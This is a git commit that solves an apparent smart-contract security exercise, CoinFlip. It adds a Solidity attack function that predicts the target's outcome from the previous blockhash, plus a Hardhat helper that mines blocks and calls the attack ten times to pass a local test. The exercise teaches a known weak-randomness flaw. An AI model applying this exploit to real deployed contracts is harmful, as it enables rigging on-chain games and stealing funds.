dc88dd8349e970bcd5cde5fdac44d200010735a7
Zach <zachwax101@gmail.com>
2023-06-08 20:33:39 -0400

    coinflip

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -10,6 +10,13 @@ contract AttackingCoinFlip {
     }
 
     function hackContract() external {
-        // Code me!
+        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        CoinFlip coinFlipContract = CoinFlip(contractAddress);
+        
+        coinFlipContract.flip(side);
+    
     }
 }
--- contracts/1. CoinFlip/CoinFlipHelper.ts
+++ contracts/1. CoinFlip/CoinFlipHelper.ts
@@ -3,6 +3,38 @@ import { ethers } from "hardhat";
 
 const helper = async (victim: any, attacker: any) => {
   // add code here that will help you pass the test
+  // wait for next block
+  await ethers.provider.send("evm_mine", []);
+  await attacker.hackContract();
+  // wait for next block
+  await ethers.provider.send("evm_mine", []);
+  await attacker.hackContract();
+
+  // wait for next block
+  await ethers.provider.send("evm_mine", []);
+  await attacker.hackContract();
+
+  // wait for next block
+  await ethers.provider.send("evm_mine", []);
+  await attacker.hackContract();
+  // wait for next block
+  await ethers.provider.send("evm_mine", []);
+  await attacker.hackContract();
+  // wait for next block
+  await ethers.provider.send("evm_mine", []);
+  await attacker.hackContract();
+  // wait for next block
+  await ethers.provider.send("evm_mine", []);
+  await attacker.hackContract();
+  // wait for next block
+  await ethers.provider.send("evm_mine", []);
+  await attacker.hackContract();
+  // wait for next block
+  await ethers.provider.send("evm_mine", []);
+  await attacker.hackContract();
+  // wait for next block
+  await ethers.provider.send("evm_mine", []);
+  await attacker.hackContract();
 };
 
 export default helper;
